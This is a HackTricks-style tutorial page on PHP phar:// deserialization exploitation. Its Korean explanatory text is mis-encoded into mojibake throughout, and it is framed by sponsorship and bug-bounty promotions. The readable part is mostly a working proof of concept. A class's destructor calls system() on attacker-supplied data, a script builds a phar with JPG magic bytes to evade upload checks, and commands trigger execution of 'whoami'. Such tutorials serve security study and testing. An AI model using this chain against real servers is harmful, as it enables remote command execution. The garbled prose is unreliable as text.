# phar:// ì—­ì§ë ¬í™”

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ì—ì„œ <strong>AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”</strong>!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ë‹¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**ë²„ê·¸ ë°”ìš´í‹° íŒ**: **í•´ì»¤ë“¤ì— ì˜í•´ ë§Œë“¤ì–´ì§„ í”„ë¦¬ë¯¸ì—„ ë²„ê·¸ ë°”ìš´í‹° í”Œë«í¼**ì¸ **Intigriti**ì— **ê°€ì…**í•˜ì„¸ìš”! ì˜¤ëŠ˜ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ì—ì„œ ì°¸ì—¬í•˜ì—¬ ìµœëŒ€ **$100,000**ì˜ ë°”ìš´í‹°ë¥¼ ë°›ìœ¼ì„¸ìš”!

{% embed url="https://go.intigriti.com/hacktricks" %}

**Phar** íŒŒì¼(PHP ì•„ì¹´ì´ë¸Œ)ì€ **ì§ë ¬í™”ëœ í˜•ì‹ìœ¼ë¡œ ë©”íƒ€ ë°ì´í„°ë¥¼ í¬í•¨**í•˜ê³  ìˆìœ¼ë¯€ë¡œ, ì´ **ë©”íƒ€ë°ì´í„°**ê°€ **ì—­ì§ë ¬í™”**ë˜ì–´ íŒŒì‹±ë  ë•Œ, **PHP** ì½”ë“œ ë‚´ì—ì„œ **ì—­ì§ë ¬í™”** ì·¨ì•½ì ì„ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ íŠ¹ì„±ì˜ ê°€ì¥ ì¢‹ì€ ì ì€ ì´ ì—­ì§ë ¬í™”ê°€ **`file\_get\_contents(), fopen(), file() ë˜ëŠ” file\_exists(), md5\_file(), filemtime() ë˜ëŠ” filesize()`**ì™€ ê°™ì´ PHP ì½”ë“œë¥¼ í‰ê°€í•˜ì§€ ì•ŠëŠ” PHP í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ë°œìƒí•œë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤.

ë”°ë¼ì„œ, **`phar://`** í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ì—¬ ì„ì˜ì˜ íŒŒì¼ì˜ í¬ê¸°ë¥¼ ê°€ì ¸ì˜¤ë„ë¡ PHP ì›¹ì„ ë§Œë“¤ ìˆ˜ ìˆëŠ” ìƒí™©ì„ ìƒìƒí•´ë³´ì„¸ìš”. ê·¸ë¦¬ê³  ì½”ë“œ ë‚´ì—ì„œ ë‹¤ìŒê³¼ ìœ ì‚¬í•œ **í´ë˜ìŠ¤**ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% code title="vunl.php" %}
```php
<?php
class AnyClass {
public $data = null;
public function __construct($data) {
$this->data = $data;
}

function __destruct() {
system($this->data);
}
}

filesize("phar://test.phar"); #The attacker can control this path
```
{% endcode %}

**phar** íŒŒì¼ì„ ë§Œë“¤ì–´ì„œ ì´ í´ë˜ìŠ¤ë¥¼ ì•…ìš©í•˜ì—¬ ë‹¤ìŒê³¼ ê°™ì´ ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% code title="create_phar.php" %}
```php
<?php

class AnyClass {
public $data = null;
public function __construct($data) {
$this->data = $data;
}

function __destruct() {
system($this->data);
}
}

// create new Phar
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

// add object of any class as meta data
$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();
```
{% endcode %}

**JPGì˜ ë§¤ì§ ë°”ì´íŠ¸**(`\xff\xd8\xff`)ê°€ phar íŒŒì¼ì˜ ì‹œì‘ ë¶€ë¶„ì— ì¶”ê°€ë˜ì–´ **ê°€ëŠ¥í•œ** íŒŒì¼ **ì—…ë¡œë“œ** **ì œí•œ**ì„ **ìš°íšŒ**í•˜ëŠ” ë°©ë²•ì„ ì£¼ëª©í•˜ì‹­ì‹œì˜¤.\
ë‹¤ìŒê³¼ ê°™ì´ `test.phar` íŒŒì¼ì„ **ì»´íŒŒì¼**í•˜ì‹­ì‹œì˜¤:
```bash
php --define phar.readonly=0 create_phar.php
```
ê·¸ë¦¬ê³  ì·¨ì•½í•œ ì½”ë“œë¥¼ ì•…ìš©í•˜ì—¬ `whoami` ëª…ë ¹ì„ ì‹¤í–‰í•˜ì‹­ì‹œì˜¤:
```bash
php vuln.php
```
### ì°¸ê³  ìë£Œ

{% embed url="https://blog.ripstech.com/2018/new-php-exploitation-technique/" %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**ë²„ê·¸ ë°”ìš´í‹° íŒ**: **Intigriti**ì— ê°€ì…í•˜ì—¬ í•´ì»¤ë“¤ì´ ë§Œë“  í”„ë¦¬ë¯¸ì—„ **ë²„ê·¸ ë°”ìš´í‹° í”Œë«í¼**ì— ì°¸ì—¬í•˜ì„¸ìš”! [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ì—ì„œ ì˜¤ëŠ˜ ê°€ì…í•˜ê³  ìµœëŒ€ **$100,000**ì˜ ë°”ìš´í‹°ë¥¼ ë°›ì•„ë³´ì„¸ìš”!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ë¡œë¶€í„° AWS í•´í‚¹ì„ ì œë¡œë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”</strong>!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜ PDFë¡œ HackTricksë¥¼ ë‹¤ìš´ë¡œë“œí•˜ê¸¸ ì›¸í•˜ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™¹**](https://peass.creator-spring.com)ì„ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks** ë° **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
